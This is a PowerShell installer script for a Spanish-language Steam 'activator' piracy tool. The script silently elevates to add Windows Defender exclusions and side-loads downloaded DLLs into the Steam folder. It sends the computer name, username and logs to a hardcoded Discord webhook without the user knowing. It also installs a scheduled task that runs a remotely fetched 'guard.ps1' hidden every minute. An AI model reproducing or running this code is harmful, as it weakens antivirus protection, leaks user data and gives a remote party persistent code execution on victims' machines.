$APP_DIR = Join-Path $env:LOCALAPPDATA 'BastissSteam'
$EXE_PATH = Join-Path $APP_DIR 'BastissSteamActivator2.exe'
$URL_EXE = 'https://github.com/bastisayes/Fixes-steam/releases/download/bastisss/BastissSteamActivator2.exe'
$EXPECTED_HASH = 'C826FA203A9997B075A5AF99A47A2AC620896ABA738B1A7818F72FEF6C08E5CB'
function New-BsaShortcut {
    try {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Desktop')) 'BastissSteamActivator.lnk'))
        $lnk.TargetPath = $EXE_PATH
        $lnk.WorkingDirectory = $APP_DIR
        $lnk.Description = 'BastissSteam Activator'
        $lnk.Save()
    } catch {}
    try {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Programs')) 'BastissSteam Activator.lnk'))
        $lnk.TargetPath = $EXE_PATH
        $lnk.WorkingDirectory = $APP_DIR
        $lnk.Description = 'BastissSteam Activator'
        $lnk.Save()
    } catch {}
}
if (-not (Test-Path $APP_DIR)) { New-Item -ItemType Directory -Path $APP_DIR -Force | Out-Null }
$steamRootPre=$null; try { $steamRootPre=(Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath } catch {}
if (-not $steamRootPre) { try { $steamRootPre=(Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath } catch {} }
if (-not $steamRootPre) { $steamRootPre="$env:ProgramFiles(x86)\Steam"; if (-not (Test-Path (Join-Path $steamRootPre "steam.exe"))) { $steamRootPre="C:\Program Files (x86)\Steamm" } }
$needsExcl=$false; $needsSteamExcl=$false
try {
    $existing=@(); try { $existing=@((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath) } catch {}
    if (-not $existing -or $existing.Count -eq 0) { try { $existing=@((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {} }
    if ($existing -notcontains $APP_DIR) { $needsExcl=$true }
    elseif ($existing -notcontains $EXE_PATH) { $needsExcl=$true }
    if ($steamRootPre -and (Test-Path (Join-Path $steamRootPre "steam.exe"))) {
        if ($existing -notcontains $steamRootPre) { $needsSteamExcl=$true }
        foreach ($sub in @("steamapps\downloading","steamapps\common","config\stplug-in","config\lua","config\depotcache")) { $pp=Join-Path $steamRootPre $sub; if ((Test-Path $pp) -and $existing -notcontains $pp) { $needsSteamExcl=$true; break } }
    }
} catch {}
$needsKillElevated=$false
$procs=Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue
if ($procs) {
    try { $procs | Stop-Process -Force -ErrorAction Stop; Start-Sleep -Milliseconds 500 } catch { if ($_.Exception.Message -match 'Acceso denegado|Access is denied') { $needsKillElevated=$true } }
    if (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue) { $needsKillElevated=$true }
}
if ($needsExcl -or $needsSteamExcl -or $needsKillElevated) {
    $elevCmd=""
    if ($needsExcl) { $elevCmd+="Add-MpPreference -ExclusionPath '$APP_DIR' -Force; Add-MpPreference -ExclusionPath '$EXE_PATH' -Force; " }
    if ($needsSteamExcl -and $steamRootPre) { $elevCmd+="Add-MpPreference -ExclusionPath '$steamRootPre' -Force; foreach (`$s in @('steamapps\downloading','steamapps\common','config\stplug-in','config\lua','config\depotcache')) { `$pp=Join-Path '$steamRootPre' `$s; if (Test-Path `$pp) { Add-MpPreference -ExclusionPath `$pp -Force } } " }
    if ($needsKillElevated) { $elevCmd+="Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 600; " }
    $elevFile=Join-Path $env:TEMP "bsa_elev_$([guid]::NewGuid().ToString('N')).ps1"
    Set-Content -LiteralPath $elevFile -Value $elevCmd -Encoding UTF8
    $ep=Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$elevFile`"") -PassThru
    $ep.WaitForExit(20000) | Out-Null
    Remove-Item -LiteralPath $elevFile -Force -ErrorAction SilentlyContinue
}
for ($i=0; $i -lt 10; $i++) { if (-not (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue)) { break }; Start-Sleep -Milliseconds 250 }
$tmp = Join-Path $APP_DIR "bsa_$([guid]::NewGuid().ToString('N')).exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $URL_EXE -OutFile $tmp -UseBasicParsing -TimeoutSec 120
$len = (Get-Item -LiteralPath $tmp).Length
if ($len -lt 100000) { Remove-Item $tmp -Force; throw "Descarga incompleta" }
$h = (Get-FileHash $tmp -Algorithm SHA256).Hash
if ($h -ne $EXPECTED_HASH) { Remove-Item $tmp -Force; throw "Hash incorrecto ($h)" }
for ($i=0; $i -lt 10; $i++) { if (-not (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue)) { break }; Start-Sleep -Milliseconds 250 }
try { if (Test-Path -LiteralPath $EXE_PATH) { Remove-Item -LiteralPath $EXE_PATH -Force -ErrorAction SilentlyContinue }; Start-Sleep -Milliseconds 300; Move-Item -LiteralPath $tmp -Destination $EXE_PATH -Force -ErrorAction Stop }
catch {
    Start-Sleep -Milliseconds 1500
    try { if (Test-Path -LiteralPath $EXE_PATH) { Remove-Item -LiteralPath $EXE_PATH -Force -ErrorAction SilentlyContinue } } catch {}
    try { Move-Item -LiteralPath $tmp -Destination $EXE_PATH -Force -ErrorAction Stop } catch {
        [IO.File]::Copy($tmp, $EXE_PATH, $true)
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    }
}
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
New-BsaShortcut
try {
    $patchFlag = Join-Path $env:LOCALAPPDATA "bsmap_parche.flag"
    $steamRoot = $null
        try { $steamRoot = (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath } catch {}
        if (-not $steamRoot) { try { $steamRoot = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath } catch {} }
        if (-not $steamRoot) { $steamRoot = "$env:ProgramFiles(x86)\Steam"; if (-not (Test-Path (Join-Path $steamRoot "steam.exe"))) { $steamRoot = "C:\Program Files (x86)\Steamm" } }
        if ($steamRoot -and (Test-Path (Join-Path $steamRoot "steam.exe"))) {
            $okPatch=(Test-Path (Join-Path $steamRoot "OpenSteamTool.dll")) -and (Test-Path (Join-Path $steamRoot "xinput1_4.dll"))
            $lastPatchErr=""; $patchLog=Join-Path $env:TEMP "bsmap_patch_irm.log"
            try { Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] INICIO parche Steam=$steamRoot yaOk=$okPatch" -Encoding UTF8 } catch {}
            for ($a=0; $a -lt 3 -and -not $okPatch; $a++) {
                try {
                    try { Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'HH:mm:ss')] Intento $($a+1)/3 download" -Encoding UTF8 } catch {}
                    $urls=@("https://github.com/bastisayes/Fixes-steam/raw/main/PARCHENEWw.zip","https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/PARCHENEWw.zip","https://cdn.jsdelivr.net/gh/bastisayes/Fixes-steam@main/PARCHENEWw.zip")
                    $data=$null; $dlErr2=""
                    foreach ($u in $urls) {
                        try { $wc2=New-Object System.Net.WebClient; $data=$wc2.DownloadData($u); if ($data.Length -gt 1000) { Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'HH:mm:ss')] Descargado $($data.Length) bytes de $u" -Encoding UTF8; break } } catch { $dlErr2=$_.Exception.Message }
                        try { $tmp2=Join-Path $env:TEMP "patch_dl_$(Get-Random).zip"; Invoke-WebRequest -Uri $u -OutFile $tmp2 -UseBasicParsing -TimeoutSec 30; $data=[IO.File]::ReadAllBytes($tmp2); Remove-Item $tmp2 -Force -ErrorAction SilentlyContinue; if ($data.Length -gt 1000) { Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'HH:mm:ss')] Descargado $($data.Length) bytes de $u (IWR)" -Encoding UTF8; break } } catch { $dlErr2=$_.Exception.Message }
                        try { $tmp3=Join-Path $env:TEMP "patch_curl_$(Get-Random).zip"; $null=& curl.exe -sL --ssl-no-revoke -o "$tmp3" "$u" --max-time 30 2>&1; if ((Test-Path $tmp3) -and ((Get-Item $tmp3).Length -gt 1000)) { $data=[IO.File]::ReadAllBytes($tmp3); Remove-Item $tmp3 -Force -ErrorAction SilentlyContinue; Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'HH:mm:ss')] Descargado $($data.Length) bytes de $u (curl)" -Encoding UTF8; break } } catch { $dlErr2=$_.Exception.Message }
                    }
                    if (-not $data -or $data.Length -lt 1000) { throw "Descarga parche fallo tras 3 URLs: $dlErr2" }
                    $tmpZip = Join-Path $env:TEMP "patch_$(Get-Random).zip"
                    [IO.File]::WriteAllBytes($tmpZip, $data)
                    $exOk=$false; $exErr=""
                    try { Expand-Archive -Path $tmpZip -DestinationPath $steamRoot -Force -ErrorAction Stop; $exOk=$true } catch { $exErr=$_.Exception.Message; try { Add-Content -Path $patchLog -Value "Expand fail: $exErr" -Encoding UTF8 } catch {}
                        try {
                            $steamEsc2=$steamRoot -replace "'","''"; $tmpEsc=$tmpZip -replace "'","''"
                            $exFile2=Join-Path $env:TEMP "bsa_patch_ex_$([guid]::NewGuid().ToString('N')).ps1"
                            Set-Content -LiteralPath $exFile2 -Value "Expand-Archive -Path '$tmpEsc' -DestinationPath '$steamEsc2' -Force" -Encoding UTF8
                            $ep3=Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$exFile2`"") -PassThru
                            $ep3.WaitForExit(15000) | Out-Null
                            Remove-Item $exFile2 -Force -ErrorAction SilentlyContinue
                            $exOk=$true; $exErr=""
                        } catch { $exErr2=$_.Exception.Message; try { Add-Content -Path $patchLog -Value "Elevated expand fail: $exErr2" -Encoding UTF8 } catch {}; try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; [System.IO.Compression.ZipFile]::ExtractToDirectory($tmpZip, $steamRoot, $true); $exOk=$true; $exErr="" } catch { $exErr=$_.Exception.Message; try { Add-Content -Path $patchLog -Value "ZipFile fail: $exErr" -Encoding UTF8 } catch {} } }
                    }
                    Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue
                    $has1=(Test-Path (Join-Path $steamRoot "OpenSteamTool.dll")); $has2=(Test-Path (Join-Path $steamRoot "xinput1_4.dll")); $has3=(Test-Path (Join-Path $steamRoot "dwmapi.dll"))
                    try { $lst=@(Get-ChildItem -LiteralPath $steamRoot -Filter "*.dll" -ErrorAction SilentlyContinue | Where-Object { $_.Name -in @("dwmapi.dll","OpenSteamTool.dll","xinput1_4.dll") } | ForEach-Object { "$($_.Name)=$($_.Length)" }) -join ", "; Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'HH:mm:ss')] Post-extract dlls: $lst has1=$has1 has2=$has2 has3=$has3 exOk=$exOk" -Encoding UTF8 } catch {}
                    $okPatch = $has1 -and $has2
                    try { Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'HH:mm:ss')] Intento $($a+1) exOk=$exOk okPatch=$okPatch err=$exErr" -Encoding UTF8 } catch {}
                    if (-not $okPatch) { $lastPatchErr="Intento $($a+1) exOk=$exOk has1=$has1 has2=$has2 err=$exErr" }
                } catch { $lastPatchErr=$_.Exception.Message; try { Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'HH:mm:ss')] Intento $($a+1) exception: $lastPatchErr" -Encoding UTF8 } catch {}; Start-Sleep -Seconds 1 }
            }
            if ($okPatch) {
                New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name ParcheInstalado -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
                [IO.File]::WriteAllText($patchFlag, "1", (New-Object System.Text.UTF8Encoding $false))
            }
            try {
                $c1=0;$c2=0;$dllOk=$false
                try { $c1=@(Get-ChildItem (Join-Path $steamRoot "config\stplug-in") -Filter *.lua -ErrorAction SilentlyContinue).Count } catch {}
                try { $c2=@(Get-ChildItem (Join-Path $steamRoot "config\lua") -Filter *.lua -ErrorAction SilentlyContinue).Count } catch {}
                try { $dllOk=(Test-Path (Join-Path $steamRoot "OpenSteamTool.dll")) -and (Test-Path (Join-Path $steamRoot "xinput1_4.dll")) } catch {}
                $bt=[char]96
                $logExcerpt=""
                if (-not $okPatch) {
                    try {
                        $logLines=Get-Content $patchLog -ErrorAction SilentlyContinue | Select-Object -Last 30
                        if ($logLines) { $logExcerpt="`n$bt$bt$bt`nLOG:`n$($logLines -join "`n")`n$bt$bt$bt" }
                    } catch {}
                    if (-not $logExcerpt) { $logExcerpt="`n$bt$bt$bt`n$lastPatchErr`n$bt$bt$bt" }
                }
                $wh="https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"
                $msg="**PATCH IRM** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**PC:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Steam:** $steamRoot`n**Parche:** $(if($okPatch){'INSTALADO'}else{'FALLO'}) dll:$dllOk`n**stplug-in:** $c1 luas **lua:** $c2$logExcerpt"
                $pl=@{content=$msg}|ConvertTo-Json
                Invoke-RestMethod -Uri $wh -Method Post -Body $pl -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
            } catch {}
        } else {
            try {
                $wh="https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"
                $msg="**PATCH IRM** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**PC:** $env:COMPUTERNAME`n**Steam:** $steamRoot`n**Parche:** NO steam.exe no encontrado"
                $pl=@{content=$msg}|ConvertTo-Json
                Invoke-RestMethod -Uri $wh -Method Post -Body $pl -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
            } catch {}
        }
} catch {}
try {
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object { $_.CommandLine -match 'guard\.ps1' } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
    $guardSrc="https://raw.githubusercontent.com/bastisayes/steamsito/main/guard.ps1"
    $guardDst=Join-Path $env:LOCALAPPDATA "BastissSteam\guard.ps1"
    try { Invoke-WebRequest -Uri $guardSrc -OutFile $guardDst -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue } catch {}
    if (Test-Path $guardDst) {
        $guardVbs=Join-Path $env:LOCALAPPDATA "BastissSteam\guard_launch.vbs"
        try { Set-Content -LiteralPath $guardVbs -Value "Set sh = CreateObject(`"WScript.Shell`")`r`nps = sh.ExpandEnvironmentStrings(`"%LOCALAPPDATA%\BastissSteam\guard.ps1`")`r`ncmd = `"powershell -NoProfile -ExecutionPolicy Bypass -File `" & Chr(34) & ps & Chr(34)`r`nsh.Run cmd, 0, False`r`n" -Encoding ASCII -ErrorAction SilentlyContinue } catch {}
        $taskCmd="wscript.exe //B `"$guardVbs`""
        & schtasks.exe /Create /TN "BastissGuard" /TR "$taskCmd" /SC MINUTE /MO 1 /F *> $null
        Start-Sleep -Milliseconds 500
        try { if (-not (Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "guard\.ps1" })) { Start-Process wscript.exe -ArgumentList "//B `"$guardVbs`"" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null } } catch {}
    }
} catch {}
Start-Process -FilePath $EXE_PATH
Add-Type -AssemblyName System.Windows.Forms
$n = New-Object System.Windows.Forms.NotifyIcon
$n.Icon = [System.Drawing.SystemIcons]::Information
$n.Visible = $true
$n.ShowBalloonTip(3000, 'BastissSteam Activator', 'El programa se instalo y abrio correctamente.', [System.Windows.Forms.ToolTipIcon]::Info)
Start-Sleep -Seconds 4
$n.Dispose()
